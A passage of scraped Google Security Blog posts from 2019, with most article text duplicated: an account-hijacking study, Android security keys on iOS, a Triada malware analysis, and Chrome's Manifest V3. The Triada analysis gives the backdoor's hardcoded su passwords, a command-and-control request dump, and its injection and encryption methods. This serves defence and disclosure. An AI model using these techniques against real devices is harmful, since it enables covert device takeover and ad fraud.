Just like buckling a seat belt, take a moment to  follow our five tips  to help keep your account secure. As our research shows, one of the easiest things you can do to protect your Google Account is to set up a recovery phone number. For high-risk users&#8212;like journalists, activists, business leaders, and political campaign teams&#8212;our  Advanced Protection Program  provides the highest level of security. You can also help protect your non-Google accounts from third-party password breaches by installing the  Password Checkup Chrome extension .                                     Posted by Kurt Thomas and Angelika Moscicki   Every day, we protect users from hundreds of thousands of account hijacking attempts. Most attacks stem from automated bots with access to third-party password breaches, but we also see phishing and targeted attacks. Earlier this year, we suggested how just five simple steps like adding a recovery phone number can help keep you safe, but we wanted to prove it in practice.  We teamed up with researchers from New York University and the University of California, San Diego to find out just how effective basic account hygiene is at preventing hijacking. The year-long study, on wide-scale attacks and targeted attacks, was presented on Wednesday at a gathering of experts, policy makers, and users called The Web Conference.  Our research shows that simply adding a recovery phone number to your Google Account can block up to 100% of automated bots, 99% of bulk phishing attacks, and 66% of targeted attacks that occurred during our investigation.    Google’s automatic, proactive hijacking protection  We provide an automatic, proactive layer of security to better protect all our users against account hijacking. Here’s how it works: if we detect a suspicious sign-in attempt (say, from a new location or device), we’ll ask for additional proof that it’s really you. This proof might be confirming you have access to a trusted phone or answering a question where only you know the correct response.  If you’ve signed into your phone or set up a recovery phone number, we can provide a similar level of protection to 2-Step Verification via device-based challenges. We found that an SMS code sent to a recovery phone number helped block 100% of automated bots, 96% of bulk phishing attacks, and 76% of targeted attacks. On-device prompts, a more secure replacement for SMS, helped prevent 100% of automated bots, 99% of bulk phishing attacks and 90% of targeted attacks.         Both device- and knowledge-based challenges help thwart automated bots, while device-based challenges help thwart phishing and even targeted attacks.     If you don’t have a recovery phone number established, then we might fall back on the weaker knowledge-based challenges, like recalling your last sign-in location. This is an effective defense against bots, but protection rates for phishing can drop to as low as 10%. The same vulnerability exists for targeted attacks. That’s because phishing pages and targeted attackers can trick you into revealing any additional identifying information we might ask for.  Given the security benefits of challenges, one might ask why we don’t require them for all sign-ins. The answer is that challenges introduce additional friction and increase the risk of account lockout. In an experiment, 38% of users did not have access to their phone when challenged. Another 34% of users could not recall their secondary email address.  If you lose access to your phone, or can’t solve a challenge, you can always return to a trusted device you previously logged in from to gain access to your account.    Digging into “hack for hire” attacks  Where most bots and phishing attacks are blocked by our automatic protections, targeted attacks are more pernicious. As part of our ongoing efforts to monitor hijacking threats, we have been investigating emerging “hack for hire” criminal groups that purport to break into a single account for a fee on the order of $750 USD. These attackers often rely on spear phishing emails that impersonate family members, colleagues, government officials, or even Google. If the target doesn’t fall for the first spear phishing attempt, follow-on attacks persist for upwards of a month.         Example man-in-the-middle phishing attack that checks for password validity in real-time. Afterwards, the page prompts victims to disclose SMS authentication codes to access the victim’s account.    We estimate just one in a million users face this level of risk. Attackers don’t target random individuals though. While the research shows that our automatic protections can help delay, and even prevent as many as 66% of the targeted attacks that we studied, we still recommend that high-risk users enroll in our Advanced Protection Program. In fact, zero users that exclusively use security keys fell victim to targeted phishing during our investigation.      Take a moment to help keep your account secure   Just like buckling a seat belt, take a moment to follow our five tips to help keep your account secure. As our research shows, one of the easiest things you can do to protect your Google Account is to set up a recovery phone number. For high-risk users—like journalists, activists, business leaders, and political campaign teams—our Advanced Protection Program provides the highest level of security. You can also help protect your non-Google accounts from third-party password breaches by installing the Password Checkup Chrome extension.      ", "date": "May 17, 2019"},
{"website": "Google-Security", "title": "\nUse your Android phone’s built-in security key to verify sign-in on iOS devices \n", "author": ["Posted by Kaiyu Yan and Christiaan Brand"], "link": "https://security.googleblog.com/2019/06/use-your-android-phones-built-in.html", "abstract": "                             Posted by Kaiyu Yan and Christiaan Brand     Compromised credentials are one of the most common causes of security breaches. While Google automatically blocks the majority of unauthorized sign-in attempts, adding 2-Step Verification (2SV) considerably improves account security. At Cloud Next &#8216;19, we  introduced  a new 2SV method, enabling more than a billion users worldwide to better protect their accounts  with a security key built into their Android phones.    This technology can be used to verify your sign-in to Google and Google Cloud services on Bluetooth-enabled Chrome OS, macOS, and Windows 10 devices. Starting today, you can use your Android phone to verify your sign-in on Apple iPads and iPhones as well.      Security keys     FIDO  security keys provide the  strongest  protection against automated bots, bulk phishing, and targeted attacks by leveraging public key cryptography to verify your identity and URL of the login page, so that an attacker can&#8217;t access your account even if you are tricked into providing your username and password. Learn more by watching our  presentation  from Cloud Next &#8216;19.              On Chrome OS, macOS, and Windows 10 devices, we leverage the Chrome browser to communicate with your Android phone&#8217;s built-in security key over Bluetooth using FIDO&#8217;s  CTAP2 protocol . On iOS devices, Google&#8217;s Smart Lock app is leveraged in place of the browser.                    User experience on an iPad with Pixel 3                      Until now, there were limited options for using FIDO2 security keys on iOS devices. Now, you can get the strongest 2SV method with the convenience of an Android phone that&#8217;s always in your pocket at no additional cost.      It&#8217;s easy to get started    Follow these simple steps to protect your Google Account today:   Step 1: Add the security key to your Google Account      Add your personal or work Google Account to your Android 7.0+ (Nougat) phone.     Make sure you&#8217;re enrolled in  2-Step Verification (2SV) .     On your computer, visit the 2SV settings and click \"Add security key\".     Choose your Android phone from the list of available devices.     Step 2: Use your Android phone's built-in security key      On both of your devices, make sure  Bluetooth is turned on .     On your iPhone or iPad (iOS version 10.0 or up),  sign in to your Google Account  with your username and password using the  Google Smart Lock app .     Check your Android phone for a notification.     Follow the instructions to confirm it&#8217;s you signing in.     You can find more detailed instructions  here . Within enterprise organizations, admins can  require the use of security keys  for their users in G Suite and Google Cloud Platform (GCP), letting them choose between using a physical security key, an Android phone, or both.   We also recommend that you register a backup hardware security key (from  Google  or a number of  other vendors ) for your account and keep it in a safe place, so that you can gain access to your account if you lose your Android phone.                                     Posted by Kaiyu Yan and Christiaan Brand   Compromised credentials are one of the most common causes of security breaches. While Google automatically blocks the majority of unauthorized sign-in attempts, adding 2-Step Verification (2SV) considerably improves account security. At Cloud Next ‘19, we introduced a new 2SV method, enabling more than a billion users worldwide to better protect their accounts  with a security key built into their Android phones.   This technology can be used to verify your sign-in to Google and Google Cloud services on Bluetooth-enabled Chrome OS, macOS, and Windows 10 devices. Starting today, you can use your Android phone to verify your sign-in on Apple iPads and iPhones as well.    Security keys  FIDO security keys provide the strongest protection against automated bots, bulk phishing, and targeted attacks by leveraging public key cryptography to verify your identity and URL of the login page, so that an attacker can’t access your account even if you are tricked into providing your username and password. Learn more by watching our presentation from Cloud Next ‘19.      On Chrome OS, macOS, and Windows 10 devices, we leverage the Chrome browser to communicate with your Android phone’s built-in security key over Bluetooth using FIDO’s CTAP2 protocol. On iOS devices, Google’s Smart Lock app is leveraged in place of the browser.       User experience on an iPad with Pixel 3       Until now, there were limited options for using FIDO2 security keys on iOS devices. Now, you can get the strongest 2SV method with the convenience of an Android phone that’s always in your pocket at no additional cost.    It’s easy to get started  Follow these simple steps to protect your Google Account today:  Step 1: Add the security key to your Google Account   Add your personal or work Google Account to your Android 7.0+ (Nougat) phone.   Make sure you’re enrolled in 2-Step Verification (2SV).   On your computer, visit the 2SV settings and click \"Add security key\".   Choose your Android phone from the list of available devices.   Step 2: Use your Android phone's built-in security key   On both of your devices, make sure Bluetooth is turned on.   On your iPhone or iPad (iOS version 10.0 or up), sign in to your Google Account with your username and password using the Google Smart Lock app.   Check your Android phone for a notification.   Follow the instructions to confirm it’s you signing in.   You can find more detailed instructions here. Within enterprise organizations, admins can require the use of security keys for their users in G Suite and Google Cloud Platform (GCP), letting them choose between using a physical security key, an Android phone, or both.  We also recommend that you register a backup hardware security key (from Google or a number of other vendors) for your account and keep it in a safe place, so that you can gain access to your account if you lose your Android phone.      ", "date": "June 12, 2019"},
{"website": "Google-Security", "title": "\nPHA Family Highlights: Triada\n", "author": ["Posted by Lukasz Siewierski, Android Security & Privacy Team"], "link": "https://security.googleblog.com/2019/06/pha-family-highlights-triada.html", "abstract": "                             Posted by Lukasz Siewierski, Android Security &amp; Privacy Team              We continue our  PHA family highlights  series with the Triada family, which was first discovered early in 2016. The main purpose of Triada apps was to install  spam apps  on a device that displays ads. The creators of Triada collected revenue from the ads displayed by the spam apps. The methods Triada used were complex and unusual for these types of apps. Triada apps started as rooting trojans, but as Google Play Protect strengthened defenses against rooting exploits, Triada apps were forced to adapt, progressing to a system image backdoor. However, thanks to OEM cooperation and our outreach efforts, OEMs prepared system images with security updates that removed the Triada infection.     History of Triada  Triada was first described in  a blog post on the Kaspersky Lab website  in March 2016 and in  a follow-up blog post  in June 2016. Back then, it was a rooting trojan that tried to exploit the device and after getting elevated privileges, it performed a host of different actions. To hide these actions from analysts, Triada used a combination of dynamic code loading and additional app installs. The Kaspersky posts detail the code injection technique used by Triada and provide some statistics on infected devices at the time. In this post, we&#8217;ll focus on the peculiar encryption routine and the unusual binary files used by Triada.   Triada&#8217;s first action was to install a type of superuser (su) binary file. This su binary allowed other apps on the device to use root permissions. The su binary used by Triada required a password, so was unique compared to regular su binary files common with other Linux systems.   The binary accepted two passwords,  od2gf04pd9  and  ac32dorbdq . This is illustrated in the IDA screenshot below. Depending on which one was provided, the binary either 1) ran the command given as an argument as root or 2) concatenated all of the arguments, ran that concatenation preceded by  sh , then ran them as root. Either way, the app had to know the correct password to run the command as root.   This Triada rooting trojan was mainly used to install apps and display ads. This trojan targeted older devices because the rooting exploits didn&#8217;t work on newer ones. Therefore, the trojan implemented a  weight watching  feature to decide if old apps needed to be deleted to make space for new installs.    Weight watching included several steps and attempted to free up space on the device&#8217;s user partition and system partition. Using a blacklist and whitelist of apps it first removed all the apps on its blacklist. If more free space was required it would remove all other apps leaving only the apps on the whitelist. This process freed space while ensuring the apps needed for the phone to function properly were not removed.   Every app on the system partition had a number, or  weight , associated with it. The weight was a sum of the number of apps installed on the same date as the app in question and the number of apps signed with the same certificate. The apps with the lowest weight were installed in isolation (that is, not on a day that the device system image was created) and weren&#8217;t signed by the OEM or weren&#8217;t part of a developer bundle. In the weight watching process, these apps were removed first, until enough space was made for the new app.             su binary accepts two passwords    In addition to installing apps that display ads, Triada injected code into four web browsers: AOSP ( com.android.browser ), 360 Secure ( com.qihoo.browser ), Cheetah (com.ijinshan.browser_fast), and Oupeng ( com.oupeng.browser ). The code was injected using the same technique described in  our blog post about the Zen PHA family  and in previously mentioned Kaspersky blog posts.   The web browser injection was done to overwrite the URLs and substitute ad banners on websites with ads benefiting the Triada authors.   Triada also used a peculiar and complex communication encryption routine. Whenever it had to send a request to the Command and Control (C&amp;C) server, it encrypted the request using two XOR loops with different passwords. Because of XOR rules, if the passwords had the same character in the same position, those characters weren&#8217;t encrypted. The encrypted request was saved to a file, which had the same name as its size. Finally, the file was zipped and sent to the C&amp;C server in the POST request body.    The example below illustrates one such request. The yellow bytes are the zip file&#8217;s signature of the central directory file header. The red bytes show the uncompressed file size of 0x0952. The blue bytes show the file name length (4) and the name itself (2386, a decimal version of 0x0952).    09 00 00  50 4B 01 02  14 00 14 00 08 00 08 00 4F ... PK.. ........O 91 F3 48 AE CF 91 D5 B1 04 00 00  52 09 00 00  04 ..H........ R... . 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00  32 33 38 36  50 4B 05 06 00 00 00 00 01 00 01 . 2386 PK......... 00 32 00 00 00 E3 04 00 00 00 00       .2.........   The underlying data protocol changed periodically. It was either a simple JSON, a list of key-value pairs similar to the properties file, or a proprietary format as shown below.    [collect_Head]device=Nexus 5X [collect_Space]xadevicekey=xxxxx &#8230; [collect_Space]collentmod=opappresultmode [collect_Space]registerUser=true [collect_End]   When Triada was discovered, we implemented detection that removed Triada samples from all devices with Google Play Protect. This implementation, combined with the increased security on newer Android devices, made it significantly harder for Triada to infect devices.     When rooting doesn&#8217;t work&#8230;  During the summer of 2017 we noticed a change in new Triada samples. Instead of rooting the device to obtain elevating privileges, Triada evolved to become a pre-installed Android framework backdoor. The changes to Triada included an additional call in the Android framework log function, demonstrated below with a highlighted configuration string.    LABEL+13:    V18 = -1; LABEL_18:    j___config_log_println(v7, v6, v10, v11, \" cf89450001 \");    if ( v10 )   This backdoored log function version of Triada was first  described by Dr.Web in July 2017 . The blog post includes a description of Triada code injection methods.    By backdooring the log function, the additional code executes every time the log method is called (that is, every time any app on the phone tries to log something). These log attempts happen many times per second, so the additional code is running non-stop. The additional code also executes in the context of the app logging a message, so Triada can execute code in any app context. The code injection framework in early versions of Triada worked on Android releases prior to Marshmallow.   The main purpose of the backdoor function was to execute code in another app&#8217;s context. The backdoor attempts to execute additional code every time the app needs to log something. Triada developers created a new file format, which we called MMD, based on the file header.    The MMD format was an encrypted version of a DEX file, which was then executed in the app context. The encryption algorithm was a double XOR loop with two different passwords. The format is illustrated below.          Each MMD file had a specific file name of the format  &lt; MD5 of the process name &gt;36.jmd . By using the MD5 of the process name, the Triada authors tried to obscure the injection target. However, the pool of all available process names is fairly small, so this hash was easily reversible.    We identified two code injection targets:  com.android.systemui  (the System UI app) and  com.android.vending  (the Google Play app). The first target was injected to get the  GET_REAL_TASKS  permission. This is a signature-level permission, which means that it can&#8217;t be held by ordinary Android apps.   Starting with Android Lollipop, the   getRecentTasks()   method is deprecated to protect users' privacy. However, apps holding the  GET_REAL_TASKS  permission can get the result of this method call. To hold the  GET_REAL_TASKS  permission, an app has to be signed with a specific certificate, the device&#8217;s platform cert, which is held by the OEM. Triada didn&#8217;t have access to this cert. Instead it executed additional code in the System UI app, which has the  GET_REAL_TASKS  permission.    The injected code returned the app running on top (the activity running in the foreground and being actively used by the device user) to other apps on the device. This app was exposed using two methods: an intent or a socket created for this purpose. When an app on the device sent the intent or wrote to a socket created by Triada&#8217;s code injection, it received the package name of the app running on top. Triada used the package name to determine if an ad was displayed. The assumption was that if the app running on top was a browser, the user would expect to see some ads, so Triada displayed ads from the background.   The second injection target was the Google Play app. This injection supported five commands and responses to them. The supported commands are shown below in Chinese, a language that was used throughout the Triada app and injection. English translations are given on the right.                  下载请求     下载结果     安装请求     安装结果     激活请求     激活结果     拉活请求     拉活结果     卸载请求     卸载结果              download request     download result     install request     installation result     activation request     activation result     pull request     pull the results     uninstall request     uninstall result              The commands trigger the heartbeat (pull request), download, installation, uninstallation (in the Google Play app context), and activation (the first execution) of the apps. In the Google Play app context, installation meant that Triada didn&#8217;t have to turn on installation from unknown sources and all app installs looked like they were from Google Play.   The apps were downloaded from the C&amp;C server and the communication with the C&amp;C was encrypted using the same custom encryption routine using double XOR and zip. The downloaded and installed apps used the package names of  unpopular apps available on Google Play. They didn&#8217;t have any relation to the apps on Google Play apart from the same package name.   The last piece of the puzzle was the way the backdoor in the log function communicated with the installed apps. This communication prompted the investigation: the change in Triada behavior mentioned at the beginning of this section made it appear that there was another component on the system image. The apps could communicate with the Triada backdoor by logging a line with a specific predefined tag and message.   The reverse communication was more complicated. The backdoor used Java properties to relay a message to the app. These properties were key-value pairs similar to Android system properties, but they were scoped to a specific process. Setting one of these properties in one app context ensures that other apps won&#8217;t see this property. Despite that, some versions of Triada indiscriminately created the properties in every single app process.   The diagram below illustrates the communication mechanisms of the Triada backdoor.             Communication mechanisms of Triada      Reverse engineering countermeasures and development  The Triada backdoor was hidden to make the analysis harder. The strings in the Android framework library that related to Triada activities were encrypted, as shown below.             Android framework strings    The strings were encrypted using the algorithm of two XOR loops. However, the first highlighted string,  36.jmd , wasn&#8217;t encrypted. This is the MMD file name string mentioned before.    Another anti-analysis measure implemented by the Triada authors was  function padding , including additional exported functions that don't serve any purpose apart from making the file size bigger and the function layout more random with every compilation. Four types of these functions are shown in the screenshots below.             Example of function padding    One final interesting feature of Triada worth mentioning is the development cycle. By analyzing subsequent versions of the Triada backdoor (up to 1.5.1) we saw the changes in the code. In the newest version, they substituted MD5 with SHA1. This is used to hash the filenames, which come from a restricted pool of values. The newest version also encrypted the  36.jmd  string and introduced changes to the code for compatibility with Android Nougat.   There are also code stubs pointing at the modification of the SystemUI and WebView Android framework elements. We couldn&#8217;t find the code that was executed by these modifications, just code stubs suggesting more development in the future.     OEM outreach  Triada infects device system images through a third-party during the production process. Sometimes OEMs want to include features that aren&#8217;t part of the Android Open Source Project, such as face unlock. The OEM might partner with a third-party that can develop the desired feature and send the whole system image to that vendor for development.   Based on analysis, we believe that a vendor using the name Yehuo or Blazefire infected the returned system image with Triada.             Production process with malicious party    We coordinated with the affected OEMs to provide system updates and remove traces of Triada. We also scan for Triada and similar threats on all Android devices.    OEMs should ensure that all third-party code is reviewed and can be tracked to its source. Additionally, any functionality added to the system image should only support requested features. It&#8217;s a good practice to perform a security review of a system image after adding third-party code.     Summary  Triada was inconspicuously included in the system image as third-party code for additional features requested by the OEMs. This highlights the need for thorough ongoing security reviews of system images before the device is sold to the users as well as any time they get updated over-the-air (OTA).   By working with the OEMs and supplying them with instructions for removing the threat from devices, we reduced the spread of preinstalled Triada variants and removed infections from the devices through the OTA updates.   The Triada case is a good example of how Android malware authors are becoming more adept. This case also shows that it&#8217;s harder to infect Android devices, especially if the malware author requires privilege elevation.   We are also performing a security review of system images through the Build Test Suite. You can read more about this program in the  Android Security 2018 Year in Review report . Triada indicators of compromise are one of many signatures included in the system image scan. Additionally, Google Play Protect continues to track and remove any known versions of Triada and Triada-related apps it detects from user devices.                                       Posted by Lukasz Siewierski, Android Security & Privacy Team      We continue our PHA family highlights series with the Triada family, which was first discovered early in 2016. The main purpose of Triada apps was to install spam apps on a device that displays ads. The creators of Triada collected revenue from the ads displayed by the spam apps. The methods Triada used were complex and unusual for these types of apps. Triada apps started as rooting trojans, but as Google Play Protect strengthened defenses against rooting exploits, Triada apps were forced to adapt, progressing to a system image backdoor. However, thanks to OEM cooperation and our outreach efforts, OEMs prepared system images with security updates that removed the Triada infection.   History of Triada Triada was first described in a blog post on the Kaspersky Lab website in March 2016 and in a follow-up blog post in June 2016. Back then, it was a rooting trojan that tried to exploit the device and after getting elevated privileges, it performed a host of different actions. To hide these actions from analysts, Triada used a combination of dynamic code loading and additional app installs. The Kaspersky posts detail the code injection technique used by Triada and provide some statistics on infected devices at the time. In this post, we’ll focus on the peculiar encryption routine and the unusual binary files used by Triada.  Triada’s first action was to install a type of superuser (su) binary file. This su binary allowed other apps on the device to use root permissions. The su binary used by Triada required a password, so was unique compared to regular su binary files common with other Linux systems.  The binary accepted two passwords, od2gf04pd9 and ac32dorbdq. This is illustrated in the IDA screenshot below. Depending on which one was provided, the binary either 1) ran the command given as an argument as root or 2) concatenated all of the arguments, ran that concatenation preceded by sh, then ran them as root. Either way, the app had to know the correct password to run the command as root.  This Triada rooting trojan was mainly used to install apps and display ads. This trojan targeted older devices because the rooting exploits didn’t work on newer ones. Therefore, the trojan implemented a weight watching feature to decide if old apps needed to be deleted to make space for new installs.   Weight watching included several steps and attempted to free up space on the device’s user partition and system partition. Using a blacklist and whitelist of apps it first removed all the apps on its blacklist. If more free space was required it would remove all other apps leaving only the apps on the whitelist. This process freed space while ensuring the apps needed for the phone to function properly were not removed.  Every app on the system partition had a number, or weight, associated with it. The weight was a sum of the number of apps installed on the same date as the app in question and the number of apps signed with the same certificate. The apps with the lowest weight were installed in isolation (that is, not on a day that the device system image was created) and weren’t signed by the OEM or weren’t part of a developer bundle. In the weight watching process, these apps were removed first, until enough space was made for the new app.     su binary accepts two passwords  In addition to installing apps that display ads, Triada injected code into four web browsers: AOSP (com.android.browser), 360 Secure (com.qihoo.browser), Cheetah (com.ijinshan.browser_fast), and Oupeng (com.oupeng.browser). The code was injected using the same technique described in our blog post about the Zen PHA family and in previously mentioned Kaspersky blog posts.  The web browser injection was done to overwrite the URLs and substitute ad banners on websites with ads benefiting the Triada authors.  Triada also used a peculiar and complex communication encryption routine. Whenever it had to send a request to the Command and Control (C&C) server, it encrypted the request using two XOR loops with different passwords. Because of XOR rules, if the passwords had the same character in the same position, those characters weren’t encrypted. The encrypted request was saved to a file, which had the same name as its size. Finally, the file was zipped and sent to the C&C server in the POST request body.   The example below illustrates one such request. The yellow bytes are the zip file’s signature of the central directory file header. The red bytes show the uncompressed file size of 0x0952. The blue bytes show the file name length (4) and the name itself (2386, a decimal version of 0x0952).  09 00 00 50 4B 01 02 14 00 14 00 08 00 08 00 4F ...PK..........O 91 F3 48 AE CF 91 D5 B1 04 00 00 52 09 00 00 04 ..H........R.... 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00 32 33 38 36 50 4B 05 06 00 00 00 00 01 00 01 .2386PK......... 00 32 00 00 00 E3 04 00 00 00 00       .2.........  The underlying data protocol changed periodically. It was either a simple JSON, a list of key-value pairs similar to the properties file, or a proprietary format as shown below.  [collect_Head]device=Nexus 5X [collect_Space]xadevicekey=xxxxx … [collect_Space]collentmod=opappresultmode [collect_Space]registerUser=true [collect_End]  When Triada was discovered, we implemented detection that removed Triada samples from all devices with Google Play Protect. This implementation, combined with the increased security on newer Android devices, made it significantly harder for Triada to infect devices.   When rooting doesn’t work… During the summer of 2017 we noticed a change in new Triada samples. Instead of rooting the device to obtain elevating privileges, Triada evolved to become a pre-installed Android framework backdoor. The changes to Triada included an additional call in the Android framework log function, demonstrated below with a highlighted configuration string.  LABEL+13:    V18 = -1; LABEL_18:    j___config_log_println(v7, v6, v10, v11, \"cf89450001\");    if ( v10 )  This backdoored log function version of Triada was first described by Dr.Web in July 2017. The blog post includes a description of Triada code injection methods.   By backdooring the log function, the additional code executes every time the log method is called (that is, every time any app on the phone tries to log something). These log attempts happen many times per second, so the additional code is running non-stop. The additional code also executes in the context of the app logging a message, so Triada can execute code in any app context. The code injection framework in early versions of Triada worked on Android releases prior to Marshmallow.  The main purpose of the backdoor function was to execute code in another app’s context. The backdoor attempts to execute additional code every time the app needs to log something. Triada developers created a new file format, which we called MMD, based on the file header.   The MMD format was an encrypted version of a DEX file, which was then executed in the app context. The encryption algorithm was a double XOR loop with two different passwords. The format is illustrated below.    Each MMD file had a specific file name of the format  36.jmd. By using the MD5 of the process name, the Triada authors tried to obscure the injection target. However, the pool of all available process names is fairly small, so this hash was easily reversible.   We identified two code injection targets: com.android.systemui (the System UI app) and com.android.vending (the Google Play app). The first target was injected to get the GET_REAL_TASKS permission. This is a signature-level permission, which means that it can’t be held by ordinary Android apps.  Starting with Android Lollipop, the getRecentTasks() method is deprecated to protect users' privacy. However, apps holding the GET_REAL_TASKS permission can get the result of this method call. To hold the GET_REAL_TASKS permission, an app has to be signed with a specific certificate, the device’s platform cert, which is held by the OEM. Triada didn’t have access to this cert. Instead it executed additional code in the System UI app, which has the GET_REAL_TASKS permission.   The injected code returned the app running on top (the activity running in the foreground and being actively used by the device user) to other apps on the device. This app was exposed using two methods: an intent or a socket created for this purpose. When an app on the device sent the intent or wrote to a socket created by Triada’s code injection, it received the package name of the app running on top. Triada used the package name to determine if an ad was displayed. The assumption was that if the app running on top was a browser, the user would expect to see some ads, so Triada displayed ads from the background.  The second injection target was the Google Play app. This injection supported five commands and responses to them. The supported commands are shown below in Chinese, a language that was used throughout the Triada app and injection. English translations are given on the right.           下载请求   下载结果   安装请求   安装结果   激活请求   激活结果   拉活请求   拉活结果   卸载请求   卸载结果        download request   download result   install request   installation result   activation request   activation result   pull request   pull the results   uninstall request   uninstall result        The commands trigger the heartbeat (pull request), download, installation, uninstallation (in the Google Play app context), and activation (the first execution) of the apps. In the Google Play app context, installation meant that Triada didn’t have to turn on installation from unknown sources and all app installs looked like they were from Google Play.  The apps were downloaded from the C&C server and the communication with the C&C was encrypted using the same custom encryption routine using double XOR and zip. The downloaded and installed apps used the package names of  unpopular apps available on Google Play. They didn’t have any relation to the apps on Google Play apart from the same package name.  The last piece of the puzzle was the way the backdoor in the log function communicated with the installed apps. This communication prompted the investigation: the change in Triada behavior mentioned at the beginning of this section made it appear that there was another component on the system image. The apps could communicate with the Triada backdoor by logging a line with a specific predefined tag and message.  The reverse communication was more complicated. The backdoor used Java properties to relay a message to the app. These properties were key-value pairs similar to Android system properties, but they were scoped to a specific process. Setting one of these properties in one app context ensures that other apps won’t see this property. Despite that, some versions of Triada indiscriminately created the properties in every single app process.  The diagram below illustrates the communication mechanisms of the Triada backdoor.     Communication mechanisms of Triada   Reverse engineering countermeasures and development The Triada backdoor was hidden to make the analysis harder. The strings in the Android framework library that related to Triada activities were encrypted, as shown below.     Android framework strings  The strings were encrypted using the algorithm of two XOR loops. However, the first highlighted string, 36.jmd, wasn’t encrypted. This is the MMD file name string mentioned before.   Another anti-analysis measure implemented by the Triada authors was function padding, including additional exported functions that don't serve any purpose apart from making the file size bigger and the function layout more random with every compilation. Four types of these functions are shown in the screenshots below.     Example of function padding  One final interesting feature of Triada worth mentioning is the development cycle. By analyzing subsequent versions of the Triada backdoor (up to 1.5.1) we saw the changes in the code. In the newest version, they substituted MD5 with SHA1. This is used to hash the filenames, which come from a restricted pool of values. The newest version also encrypted the 36.jmd string and introduced changes to the code for compatibility with Android Nougat.  There are also code stubs pointing at the modification of the SystemUI and WebView Android framework elements. We couldn’t find the code that was executed by these modifications, just code stubs suggesting more development in the future.   OEM outreach Triada infects device system images through a third-party during the production process. Sometimes OEMs want to include features that aren’t part of the Android Open Source Project, such as face unlock. The OEM might partner with a third-party that can develop the desired feature and send the whole system image to that vendor for development.  Based on analysis, we believe that a vendor using the name Yehuo or Blazefire infected the returned system image with Triada.     Production process with malicious party  We coordinated with the affected OEMs to provide system updates and remove traces of Triada. We also scan for Triada and similar threats on all Android devices.   OEMs should ensure that all third-party code is reviewed and can be tracked to its source. Additionally, any functionality added to the system image should only support requested features. It’s a good practice to perform a security review of a system image after adding third-party code.   Summary Triada was inconspicuously included in the system image as third-party code for additional features requested by the OEMs. This highlights the need for thorough ongoing security reviews of system images before the device is sold to the users as well as any time they get updated over-the-air (OTA).  By working with the OEMs and supplying them with instructions for removing the threat from devices, we reduced the spread of preinstalled Triada variants and removed infections from the devices through the OTA updates.  The Triada case is a good example of how Android malware authors are becoming more adept. This case also shows that it’s harder to infect Android devices, especially if the malware author requires privilege elevation.  We are also performing a security review of system images through the Build Test Suite. You can read more about this program in the Android Security 2018 Year in Review report. Triada indicators of compromise are one of many signatures included in the system image scan. Additionally, Google Play Protect continues to track and remove any known versions of Triada and Triada-related apps it detects from user devices.       ", "date": "June 6, 2019"},
{"website": "Google-Security", "title": "\nImproving Security and Privacy for Extensions Users\n", "author": ["Posted by Devlin Cronin, Chrome Extensions Team"], "link": "https://security.googleblog.com/2019/06/improving-security-and-privacy-for.html", "abstract": "                             No, Chrome isn&#8217;t killing ad blockers -- we&#8217;re making them safer     Posted by Devlin Cronin, Chrome Extensions Team    The Chrome Extensions ecosystem has seen incredible advancement, adoption, and growth since its launch over ten years ago. Extensions are a great way for users to customize their experience in Chrome and on the web. As this system grows and expands in both reach and power, user safety and protection remains a core focus of the Chromium project.   In October, we  announced a number of changes  to improve the security, privacy, and performance of Chrome extensions. These changes include increased user options to control extension permissions, changes to the review process and readability requirements, and requiring two-step verification for developers. In addition, we&#8217;ve helped curb abuse through  restricting inline installation  on websites,  preventing the use of deceptive installation practices , and  limiting the data collected by extensions . We&#8217;ve also made changes to the teams themselves &#8212; over the last year, we&#8217;ve increased the size of the engineering teams that work on extension abuse by over 300% and the number of reviewers by over 400%.   These and other changes have driven down the rate of malicious installations by 89% since early 2018. Today, we block approximately 1,800 malicious uploads a month, preventing them from ever reaching the store. While the Chrome team is proud of these improvements, the review process alone can't catch all abuse. In order to provide better protection to our users, we need to make changes to the platform as well. This is the suite of changes we&#8217;re calling Manifest V3.   This effort is motivated by a desire to keep users safe and to give them more visibility and control over the data they&#8217;re sharing with extensions. One way we are doing this is by helping users be deliberate in granting access to sensitive data - such as emails, photos, and access to social media accounts. As we make these changes we want to continue to support extensions in empowering users and enhancing their browsing experience.   To help with this balance, we&#8217;re reimagining the way a number of powerful APIs work. Instead of a user granting each extension access to all of their sensitive data, we are creating ways for developers to request access to only the data they need to accomplish the same functionality. One example of this is the introduction of the Declarative Net Request API, which is replacing parts of the Web Request API.   At a high level, this change means that an extension does not need access to all a user&#8217;s sensitive data in order to block content. With the current Web Request API, users grant permission for Chrome to pass all information about a network request - which can include things like emails, photos, or other private information - to the extension. In contrast, the Declarative Net Request API allows extensions to block content without requiring the user to grant access to any sensitive information. Additionally, because we are able to cut substantial overhead in the browser, the Declarative Net Request API can have significant, system-level performance benefits over Web Request.              This has been a controversial change since the Web Request API is used by many popular extensions, including ad blockers. We are not preventing the development of ad blockers or stopping users from blocking ads. Instead, we want to help developers, including content blockers, write extensions in a way that protects users&#8217; privacy.   You can read more about the Declarative Net Request API and how it compares to the Web Request API  here .   We understand that these changes will require developers to update the way in which their extensions operate. However, we think it is the right choice to enable users to limit the sensitive data they share with third-parties while giving them the ability to curate their own browsing experience. We are continuing to iterate on many aspects of the Manifest V3 design, and are working with the developer community to find solutions that both solve the use cases extensions have today and keep our users safe and in control.                                           No, Chrome isn’t killing ad blockers -- we’re making them safer  Posted by Devlin Cronin, Chrome Extensions Team  The Chrome Extensions ecosystem has seen incredible advancement, adoption, and growth since its launch over ten years ago. Extensions are a great way for users to customize their experience in Chrome and on the web. As this system grows and expands in both reach and power, user safety and protection remains a core focus of the Chromium project.  In October, we announced a number of changes to improve the security, privacy, and performance of Chrome extensions. These changes include increased user options to control extension permissions, changes to the review process and readability requirements, and requiring two-step verification for developers. In addition, we’ve helped curb abuse through restricting inline installation on websites, preventing the use of deceptive installation practices, and limiting the data collected by extensions. We’ve also made changes to the teams themselves — over the last year, we’ve increased the size of the engineering teams that work on extension abuse by over 300% and the number of reviewers by over 400%.  These and other changes have driven down the rate of malicious installations by 89% since early 2018. Today, we block approximately 1,800 malicious uploads a month, preventing them from ever reaching the store. While the Chrome team is proud of these improvements, the review process alone can't catch all abuse. In order to provide better protection to our users, we need to make changes to the platform as well. This is the suite of changes we’re calling Manifest V3.  This effort is motivated by a desire to keep users safe and to give them more visibility and control over the data they’re sharing with extensions. One way we are doing this is by helping users be deliberate in granting access to sensitive data - such as emails, 